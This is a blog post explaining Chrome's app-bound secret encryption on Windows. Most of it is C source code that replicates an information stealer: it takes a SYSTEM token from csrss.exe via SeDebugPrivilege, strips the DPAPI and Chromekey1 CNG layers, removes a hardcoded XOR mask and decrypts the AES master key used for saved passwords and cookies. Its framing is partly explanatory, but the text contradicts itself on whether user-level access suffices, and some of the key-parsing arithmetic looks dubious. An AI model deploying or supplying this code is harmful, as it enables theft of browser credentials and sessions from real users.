---
layout: post
title: "Breaking Chrome Secret Encryption on Windows (DPAPI + AES-256-GCM)"
date: 2026-03-14 10:00:00 +0700
categories: [Security, Malware, Windows]
---

## Background

Google Chrome stores sensitive data such as passwords, cookies, and session tokens. To protect this information, Chrome encrypts secrets using **AES-256-GCM**, while the encryption key itself is protected by **Windows DPAPI**.

This layered design is intended to prevent other applications from accessing user secrets.

However, many information-stealing malware families are still able to extract and decrypt this data in seconds.

In this article, we will analyze how Chrome protects its secrets and demonstrate how the encryption can be reversed to steal stored credentials.

## Chrome Secret Encryption Mechanism on Windows

The Story of Chrome and the Secret Treasure

One day, Google Chrome had to protect some very important secrets:

+ Your website passwords

+ Your login cookies

Chrome stored these secrets inside a notebook called SQLite. But Chrome knew something important:

“If someone steals my notebook, they must NOT be able to read the secrets.”. So Chrome built several layers of protection.

Step 1 — Hide the secret with encryption

Before writing the password into the notebook, Chrome encrypts it using the Advanced Encryption Standard (AES-256-GCM).

For example:

Real password: 123456

After encryption, it becomes something like: v20 A83F92A1F0C8B...

The `v20` prefix indicates the Chrome encryption version. Modern Chrome secrets follow the format:

| Component   | Size        | Description |
|-------------|-------------|-------------|
| `v20`       | **3 bytes** | Chrome encryption version marker |
| `nonce`     | **12 bytes**| Random IV used for AES-GCM |
| `ciphertext`| **variable**    | Encrypted secret (password/cookie) |
| `tag`       | **16 bytes**| GCM authentication tag |

--> Now the password looks like random data.

Without the correct key, it is impossible to turn this encrypted value back into the original password.

Step 2 — The secret key

Chrome has a special key called the AES Master Key. Think of it like a golden key 🔑 that can unlock the scrambled password.

But Chrome worries again:

“What if someone steals the golden key?”. So Chrome hides the key too.

Step 3 — Lock the key inside another box

Chrome puts the golden key inside another locked box. This special lock is called AppBound encryption.

This means:

"In theory, only Chrome should be able to access this key. In practice, any process running under the same user context may still retrieve it." 
The locked key is stored in a file called:

Local State

But Chrome still wants more security. Step 4 — Give the key to Windows to guard

Chrome says:

“Windows, please guard my key.” So Windows stores the key inside its secure vault using the system called Windows Cryptography API: Next Generation.

Inside Windows, the key is known as ChromeKey1. Now the key is protected by:

+ Your Windows user account

+ Your computer system

+ Windows security

It’s like putting the key inside a giant bank vault. The Whole Protection Chain

So the secret protection looks like this:
```php
Password / Cookie
        │
        ▼
AES scrambling
        │
        ▼
AES Master Key
        │
        ▼
AppBound lock
        │
        ▼
ChromeKey1
        │
        ▼
Windows Security Vault
```
Many locks. Many protections. When Chrome needs the password again

When you visit a website, Chrome needs the password. So Chrome asks Windows:

“Hey Windows, can I have my key back?”, Windows checks:

+ Are you the correct user?

+ Are you running Chrome?

If everything is okay, Windows gives the key back. Then Chrome:

+ Unlocks the AES key

+ Uses it to unscramble the password

+ And the real password appears again.

Why malware can still steal cookies? If a malicious program runs as the same user, Windows might think:

“This program is allowed.”

So Windows may still return the key. Then the malware can:

+ read the Chrome files

+ ask Windows for the key

+ decrypt the cookies and passwords

That’s how many Chrome stealers work.

## Breaking Chrome Secret Protection (Implementation)

## 1️⃣ Overview
Implementation Overview

In this section, we will replicate the exact steps used by information stealers to recover Chrome secrets.


## 2️⃣ Attack Flow


| # | Step | Description |
|---|------|------------|
| 1 | `Read Local State` | Read the `Local State` file to obtain the encrypted key |
| 2 | `Extract AppBoundKey` | Extract `app_bound_encrypted_key` (Base64 encoded) |
| 3 | `Decode Base64` | Decode the Base64 string into raw bytes |
| 4 | `DPAPI Decrypt` | Decrypt using DPAPI (User + SYSTEM context) |
| 5 | `CNG Decrypt` | Decrypt using `ChromeKey1` via Windows CNG (BCrypt) |
| 6 | `XOR Unmask` | Remove XOR-based obfuscation layer |
| 7 | `AES-GCM Decrypt` | Decrypt the blob to retrieve the AES Master Key |
| 8 | `Decrypt Secrets` | Use the Master Key to decrypt cookies and passwords |

## 3️⃣ Functions of Program



### ReadFileContents

```php
PUCHAR ReadFileContents(_In_ PWCHAR FileName, _Inout_ PULONG Size)
{
    HANDLE FileHandle;
    ULONG  FileSize;
    ULONG  BytesRead;
    BOOL   Result;
    PUCHAR Buffer = 0;

    FileHandle = CreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

    if (FileHandle == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Couldn't open a handle on the: %ws file: %lu\n", FileName, GetLastError());
        return 0;
    }

    do
    {
        FileSize = GetFileSize(FileHandle, 0);

        if (FileSize == 0)
        {
            wprintf(L"Couldn't get the size of the: %ws file: %lu\n", FileName, GetLastError());
            break;
        }

        Buffer = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, FileSize);

        if (Buffer == 0)
        {
            wprintf(L"Couldn't allocate the %lu bytes to read : %ws\n", FileSize, FileName);
            break;
        }

        Result = ReadFile(FileHandle, Buffer, FileSize, &BytesRead, 0);

        if (Result == FALSE || BytesRead != FileSize)
        {
            wprintf(L"Could read the: %ws file: %lu\n", FileName, GetLastError());
            HeapFree(GetProcessHeap(), 0, Buffer);
            Buffer = 0;
        }
        else if (Size != 0)
        {
            *Size = FileSize;
        }
    } while (FALSE);

    CloseHandle(FileHandle);
    return Buffer;
}
```
--> `This function opens a file, reads all of its contents into a heap-allocated memory buffer, and returns the raw bytes along with the file size for further processing.`




### ExtractAppBoundKey

```php
CONST CHAR kCryptAppBoundKeyPrefix[] = { 'A', 'P', 'P', 'B' };

BOOLEAN ExtractAppBoundKey(_In_ PSTR LocalState, _Out_ PUCHAR DecryptedKey)
{
    PSTR    AppBoundKey;
    BOOLEAN Result;
    PUCHAR  DecodedKey;
    ULONG   KeySize;

    

    AppBoundKey = strstr(LocalState, "app_bound_encrypted_key");

    if (AppBoundKey == 0)
    {
        wprintf(L"Could not find the AppBound key in the local state file\n");
        return FALSE;
    }

    

    AppBoundKey += sizeof("\"app_bound_encrypted_key\"");
    KeySize = strchr(AppBoundKey, '"') - AppBoundKey;

    

    DecodedKey = Base64Decode(AppBoundKey, KeySize, &KeySize);

    if (DecodedKey == 0)
    {
        return FALSE;
    }

    

    Result = DecryptAppBoundKey(DecodedKey + sizeof(kCryptAppBoundKeyPrefix), KeySize - sizeof(kCryptAppBoundKeyPrefix), DecryptedKey); // Skip over the key's header ("APPB")
    HeapFree(GetProcessHeap(), 0, DecodedKey);

    return Result;
}
```

The ExtractAppBoundKey function is responsible for extracting the encrypted app-bound key from the local state JSON file and decrypting it. It takes two parameters:

+ LocalState - The contents of the local state JSON file.

+ DecryptedKey - A buffer that will receive the decrypted app-bound key.

--> `Extracts the app-bound key by locating the app_bound_encrypted_key in the Local State file, Base64-decoding it, removing the "APPB" header, and decrypting the remaining blob using DPAPI and AES-256-GCM to recover the plaintext AES master key.`




### Base64Decode

```php
PBYTE Base64Decode(IN LPCSTR pszInput, IN DWORD cbInput, OUT PDWORD pcbOutput)
{
    PBYTE   pbOutput = NULL;
    DWORD   dwOutput = 0x00;

    if (!pszInput || cbInput == 0 || !pcbOutput) return NULL;

    *pcbOutput = 0;

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, NULL, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!(pbOutput = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwOutput)))
    {
        DBGA("[!] HeapAlloc Failed With Error: %lu", GetLastError());
        return NULL;
    }

    if (!CryptStringToBinaryA(pszInput, cbInput, CRYPT_STRING_BASE64, pbOutput, &dwOutput, NULL, NULL))
    {
        DBGA("[!] CryptStringToBinaryA Failed With Error: %lu", GetLastError());
        HEAP_FREE(pbOutput);
        return NULL;
    }

    *pcbOutput = dwOutput;
    return pbOutput;
}
```
--> `This function decodes the Base64-encoded app_bound_encrypted_key into raw bytes so it can be passed to DPAPI (CryptUnprotectData) for decryption.`


### GetProcessPid
```php
ULONG GetProcessPid(_In_ LPCWSTR ProcessName)
{
    HANDLE         Snapshot;
    ULONG          ProcessId = 0;
    PROCESSENTRY32 Entry;



    Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Snapshot == INVALID_HANDLE_VALUE)
    {
        return 0;
    }

    Entry.dwSize = sizeof(PROCESSENTRY32);



    if (Process32First(Snapshot, &Entry) == FALSE)
    {
        CloseHandle(Snapshot);
        return 0;
    }



    do
    {
        if (wcscmp(Entry.szExeFile, ProcessName) == 0)
        {
            ProcessId = Entry.th32ProcessID;
            break;
        }

    } while (Process32Next(Snapshot, &Entry));



    CloseHandle(Snapshot);
    return ProcessId;
}
```

--> `This function enumerates running processes to find a process by name and returns its Process ID (PID).`


### GetSystemToken

```php
typedef NTSTATUS(NTAPI* RtlAcquirePrivilege_t)(
    PULONG Privilege,
    ULONG NumPriv,
    ULONG Flags,
    PVOID* ReturnedState
    );

typedef NTSTATUS(NTAPI* RtlReleasePrivilege_t)(
    PVOID State
    );


#define SE_DEBUG_PRIVILEGE 20

HANDLE GetSystemToken()
{
    NTSTATUS Status;
    ULONG Privilege = SE_DEBUG_PRIVILEGE;
    PVOID State;

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");

    RtlAcquirePrivilege_t RtlAcquirePrivilege =
        (RtlAcquirePrivilege_t)GetProcAddress(ntdll, "RtlAcquirePrivilege");

    Status = RtlAcquirePrivilege(&Privilege, 1, 0, &State);

    if (!NT_SUCCESS(Status))
    {
        wprintf(L"Could not acquire SeDebugPrivilege: 0x%08lX\n", Status);
        return NULL;
    }

    return OpenProcessTokenByName(L"csrss.exe");
}
```

--> `Enables SeDebugPrivilege → opens token of csrss.exe → gains SYSTEM privileges. csrss.exe is targeted because it runs as SYSTEM and is a trusted critical process.`



### OpenProcessTokenByName

```php
HANDLE OpenProcessTokenByName(_In_ LPCWSTR ProcessName)
{
    ULONG  ProcessId;
    HANDLE ProcessHandle;
    HANDLE TokenHandle = 0;

    ProcessId = GetProcessPid(ProcessName);

    if (ProcessId == 0)
    {
        wprintf(L"Could not get the PID of: %ws\n", ProcessName);
        return 0;
    }




    ProcessHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, ProcessId);

    if (ProcessHandle == INVALID_HANDLE_VALUE)
    {
        wprintf(L"Could not open a handle to: %lu error: %lu\n", ProcessId, GetLastError());
        return 0;
    }



    if (OpenProcessToken(ProcessHandle, TOKEN_QUERY | TOKEN_DUPLICATE, &TokenHandle) == FALSE)
    {
        wprintf(L"Could not open a handle to the token of: %lu error: %lu\n", ProcessId, GetLastError());
    }

    CloseHandle(ProcessHandle);
    return TokenHandle;
}
```
--> `This function retrieves the access token of a target process (csrss.exe) by resolving its PID, opening the process, and calling OpenProcessToken with duplicate rights. The returned token can later be used for impersonation or spawning processes under the target’s security context (SYSTEM).`



### DecryptAppBoundKey

```php
CONST UCHAR XorKey[] = {
    0x13, 0x7A, 0xD2, 0x4F, 0x99, 0x21, 0xB6, 0x8C,
    0xE5, 0x3B, 0x60, 0xAA, 0xF1, 0x0D, 0x47, 0x92,
    0x5E, 0xC8, 0x14, 0x6F, 0x2A, 0xD9, 0x73, 0xBC,
    0x81, 0x36, 0xAF, 0x55, 0x08, 0xE2, 0x9C, 0x4A
};

BOOLEAN DecryptAppBoundKey(_In_ PUCHAR AppBoundKey, _In_ ULONG AppBoundKeySize, _Out_ PUCHAR DecryptedKey)
{
    DATA_BLOB EncryptedKey;
    DATA_BLOB UserKey;
    DATA_BLOB Key = { 0 };
    PUCHAR    AesKey;
    PUCHAR    Nonce;
    PUCHAR    Ciphertext;
    PUCHAR    Tag;
    BOOLEAN   Result;
    HANDLE    SystemToken;

    SystemToken = GetSystemToken();

    if (SystemToken == 0)
    {
        return 0;
    }

    do
    {
        

        Result = ImpersonateLoggedOnUser(SystemToken);

        if (Result == FALSE)
        {
            break;
        }

        EncryptedKey.pbData = AppBoundKey;
        EncryptedKey.cbData = AppBoundKeySize;

        Result = CryptUnprotectData(&EncryptedKey, 0, 0, 0, 0, 0, &UserKey);
        RevertToSelf();

        if (Result == FALSE)
        {
            wprintf(L"Could not decrypt the app-bound key as SYSTEM\n");
            break;
        }

        

        Result = CryptUnprotectData(&UserKey, 0, 0, 0, 0, 0, &Key);
        LocalFree(UserKey.pbData);

        if (Result == FALSE)
        {
            wprintf(L"Could not decrypt the app-bound key as the Chrome user\n");
            break;
        }

        

        AesKey = *(PULONG)Key.pbData + (Key.pbData + sizeof(ULONG)) + sizeof(ULONG) + 1;
        Nonce = AesKey + 32;        
        Ciphertext = Nonce + 12;     
        Tag = Ciphertext + 32;       

        

        Result = ImpersonateLoggedOnUser(SystemToken);

        if (Result == FALSE)
        {
            break;
        }

        Result = DecryptUsingChromeKey(AesKey);
        RevertToSelf();

        if (Result == FALSE)
        {
            break;
        }

        for (UCHAR Index = 0; Index < 32; Index++)
        {
            AesKey[Index] ^= XorKey[Index];
        }

        

        Result = Aes256GcmDecrypt(AesKey, 32, Nonce, 12, Tag, 16, Ciphertext, 32);

        if (Result == TRUE)
        {
            RtlCopyMemory(DecryptedKey, Ciphertext, 32);
        }

    } while (FALSE);

    if (Key.pbData != 0)
    {
        LocalFree(Key.pbData);
    }

    CloseHandle(SystemToken);
    return Result;
}
```
+ Level 1 : The AppBoundKey is first protected using the Windows Data Protection API under the SYSTEM context.

To decrypt it, the process must impersonate the SYSTEM user:

```php
ImpersonateLoggedOnUser(SystemToken);
CryptUnprotectData(&EncryptedKey, ..., &UserKey);
RevertToSelf();
```
This removes the outer DPAPI layer and produces an intermediate blob:

UserKey – still encrypted, but now bound to the Chrome user context.

+ Level 2 : User-level DPAPI Decryption

The second layer is protected using the Chrome user’s DPAPI context:

```php
CryptUnprotectData(&UserKey, ..., &Key);
```
At this point, all DPAPI protection is removed.

However, the result is not yet the final key. Instead, Key.pbData contains a structured blob defined by Chrome.

+ Level 3 : Parsing Chrome’s Key Structure

| Component   | Size        | Description                              |
|------------|------------|------------------------------------------|
| `AesKey`     | **32 bytes**   | Key used for final decryption (AES-256)  |
| `Nonce`      | **12 bytes**   | Initialization vector (IV)               |
| `Ciphertext` | **Variable**   | Encrypted app-bound key                  |
| `Tag`       | **16 bytes**   | GCM authentication tag                   |

+ Level 4 : Decrypting Chrome’s Internal AES Key

The extracted AesKey is still protected using a Chrome-specific key stored in the system’s cryptographic provider.

This requires SYSTEM privileges again:
```php
ImpersonateLoggedOnUser(SystemToken);
DecryptUsingChromeKey(AesKey);
RevertToSelf();
```

+ Level 5 : XOR Deobfuscation

After decryption, the AES key is further obfuscated using a fixed XOR mask:
```php
AesKey[i] ^= XorKey[i];
```
This step removes a lightweight obfuscation layer applied by Chrome to avoid exposing the key directly in memory.

+ Level 6 : Final AES-GCM Decryption

Finally, the fully recovered AES key is used to decrypt the application-bound key:
```php
Aes256GcmDecrypt(AesKey, ..., Ciphertext);
```

If successful, the result is copied to the output buffer:
```php
RtlCopyMemory(DecryptedKey, Ciphertext, 32);
```

--> The protection model can be summarized as:
```php
DPAPI (SYSTEM)
   ↓
DPAPI (USER)
   ↓
Chrome-specific encryption (AES + XOR)
   ↓
Final App-Bound Key
```

### Aes256GcmDecrypt

```php
BOOLEAN Aes256GcmDecrypt(_In_ PUCHAR Key, _In_ ULONG KeySize, _In_ PUCHAR Nonce, _In_ ULONG NonceSize, _In_ PUCHAR Tag, _In_ ULONG TagSize, _Inout_ PUCHAR Ciphertext, _Inout_ ULONG CiphertextLength)
{
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO CipherInfo;
    BCRYPT_ALG_HANDLE                     AlgorithmHandle;
    BCRYPT_KEY_HANDLE                     KeyHandle = 0;
    UCHAR                                 Buffer[AES_KEY_BLOB_SIZE];
    BCRYPT_KEY_DATA_BLOB_HEADER* KeyBlob;
    ULONG                                 PlaintextSize;
    NTSTATUS                              Status;



    Status = BCryptOpenAlgorithmProvider(&AlgorithmHandle, BCRYPT_AES_ALGORITHM, 0, 0);

    if (!BCRYPT_SUCCESS(Status))
    {
        wprintf(L"Could not open a handle on the AES algorithm provider: 0x%08lX\n", Status);
        return FALSE;
    }

    do
    {


        Status = BCryptSetProperty(AlgorithmHandle, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            break;
        }



        KeyBlob = (BCRYPT_KEY_DATA_BLOB_HEADER*)Buffer;
        KeyBlob->dwMagic = BCRYPT_KEY_DATA_BLOB_MAGIC;
        KeyBlob->dwVersion = 1;
        KeyBlob->cbKeyData = KeySize;

        RtlCopyMemory(Buffer + sizeof(BCRYPT_KEY_DATA_BLOB_HEADER), Key, KeySize);

        Status = BCryptImportKey(AlgorithmHandle, 0, BCRYPT_KEY_DATA_BLOB, &KeyHandle, 0, 0, Buffer, sizeof(Buffer), 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            wprintf(L"Could not import AES key: 0x%08lX\n", Status);
            break;
        }

    

        BCRYPT_INIT_AUTH_MODE_INFO(CipherInfo);
        CipherInfo.pbNonce = Nonce;
        CipherInfo.cbNonce = NonceSize;
        CipherInfo.pbTag = Tag;
        CipherInfo.cbTag = TagSize;


        Status = BCryptDecrypt(KeyHandle, Ciphertext, CiphertextLength, &CipherInfo, 0, 0, Ciphertext, CiphertextLength, &CiphertextLength, 0);

        if (!BCRYPT_SUCCESS(Status))
        {
            wprintf(L"Could not decrypt the ciphertext: 0x%08lX\n", Status);
        }

    } while (FALSE);

    if (KeyHandle != 0)
    {
        BCryptDestroyKey(KeyHandle);
    }

    BCryptCloseAlgorithmProvider(AlgorithmHandle, 0);
    return BCRYPT_SUCCESS(Status);
}
```

--> `The function uses Windows CNG (BCrypt) to perform AES-256-GCM decryption in-place.
It first opens an AES provider and explicitly sets the chaining mode to GCM, as the mode is not fixed by default.

The raw AES key is wrapped into a BCRYPT_KEY_DATA_BLOB structure and imported into the CNG subsystem.

The authenticated cipher parameters are then configured using the nonce and authentication tag. This implementation does not include AAD (Additional Authenticated Data).

Finally, BCryptDecrypt is used to both decrypt and verify integrity. If the authentication tag is invalid, the operation fails, preventing tampered data from being accepted.

The decryption is performed in-place, meaning the ciphertext buffer is overwritten with plaintext, which may be unsafe if authentication fails.`

### DecryptUsingChromeKey

```php
BOOLEAN DecryptUsingChromeKey(_In_ PUCHAR Ciphertext)
{
    NCRYPT_PROV_HANDLE ProviderHandle;
    NCRYPT_KEY_HANDLE  KeyHandle;
    ULONG              BytesDecrypted;
    SECURITY_STATUS    Status;


    Status = NCryptOpenStorageProvider(&ProviderHandle, L"Microsoft Software Key Storage Provider", 0);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Could not open key storage provider: 0x%08lX\n", Status);
        return FALSE;
    }



    Status = NCryptOpenKey(ProviderHandle, &KeyHandle, L"Google Chromekey1", 0, 0);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Could not open the Google Chromekey1 key: 0x%08lX\n", Status);
        NCryptFreeObject(ProviderHandle);
        return FALSE;
    }



    Status = NCryptDecrypt(KeyHandle, Ciphertext, 32, 0, Ciphertext, 32, &BytesDecrypted, NCRYPT_SILENT_FLAG);
    NCryptFreeObject(KeyHandle);
    NCryptFreeObject(ProviderHandle);

    if (Status != ERROR_SUCCESS)
    {
        wprintf(L"Failed decrypting the app-bound key using the Chromekey1 key: 0x%08lX\n", Status);
        return FALSE;
    }

    return TRUE;
}
```


--> `This function uses Windows CNG APIs to retrieve the Chrome-specific key (Google Chromekey1) from the Microsoft Software Key Storage Provider and uses it to decrypt a 32-byte app-bound encrypted key in-place. This step effectively recovers the raw AES key used by Chrome to protect sensitive data such as cookies and saved passwords.`